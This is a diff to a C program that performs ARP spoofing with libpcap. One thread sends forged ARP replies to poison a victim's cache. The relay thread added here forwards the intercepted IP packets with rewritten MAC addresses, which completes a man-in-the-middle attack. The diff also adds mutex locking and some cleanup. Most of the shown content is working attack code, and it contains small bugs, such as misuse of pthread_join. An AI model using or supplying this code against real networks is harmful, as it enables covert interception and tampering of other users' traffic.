@@ -109,7 +109,7 @@ int main(int argc, char** argv)
            !memcmp(shareData.targetMAC, NULL_MAC, 6));
     pcap_close(pktDescriptor);
 
-    sleep(1);
+    sleep(2);
     pthread_create(&threadID[0], NULL, thread_arp_processor, interface);
     pthread_create(&threadID[1], NULL, thread_relay_processor, interface);
     pthread_join(&threadID[0], (void*)&threadStatus);
@@ -144,6 +144,7 @@ void* thread_arp_processor(char* interface)
     memcpy(repSpoof.arpHeader.dstMAC, shareData.senderMAC, ETHER_ADDR_LEN);
     while(1)
     {
+        pthread_mutex_lock(&myMutex);
         timer += clock();
         if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
         {
@@ -172,13 +173,47 @@ void* thread_arp_processor(char* interface)
             timer = 0;
             pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
         }
+        pthread_mutex_unlock(&myMutex);
         sleep(1);
     }
+    pcap_close(pktDescriptor);
 }
 void* thread_relay_processor(char* interface)
 {
+    pcap_t* pktDescriptor;
+    ETH* ethHeader;
+    IP* ipHeader;
+    char errBuf[PCAP_ERRBUF_SIZE];
+
+    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);
+
+    if (!pktDescriptor)
+    {
+        printf("[RelayThread] Can't open %s interface resason: %s\n", interface, errBuf);
+    }
     while(1)
     {
+        pthread_mutex_lock(&myMutex);
+        if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
+        {
+            ethHeader = (ETH*)(readedData);
+
+            if(ntohs(ethHeader->_802_3_len) == ETHERTYPE_IP)
+            {
+                ipHeader = (IP*)(readedData+14);
+                if (!memcmp(ethHeader->_802_3_shost, shareData.senderMAC, ETHER_ADDR_LEN) &&
+                    !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) &&
+                    (ntohl(ipHeader->ip_src.s_addr) == shareData.senderIP) &&
+                    (ntohl(ipHeader->ip_dst.s_addr) != shareData.localhostIP) )
+                {
+                    memcpy(ethHeader->_802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
+                    memcpy(ethHeader->_802_3_shost, shareData.localhostMAC, ETHER_ADDR_LEN);
+                    pcap_sendpacket(pktDescriptor, readedData, pktData->len);
+                }
+            }
+        }
+        pthread_mutex_unlock(&myMutex);
         sleep(1);
     }
+    pcap_close(pktDescriptor);
 }
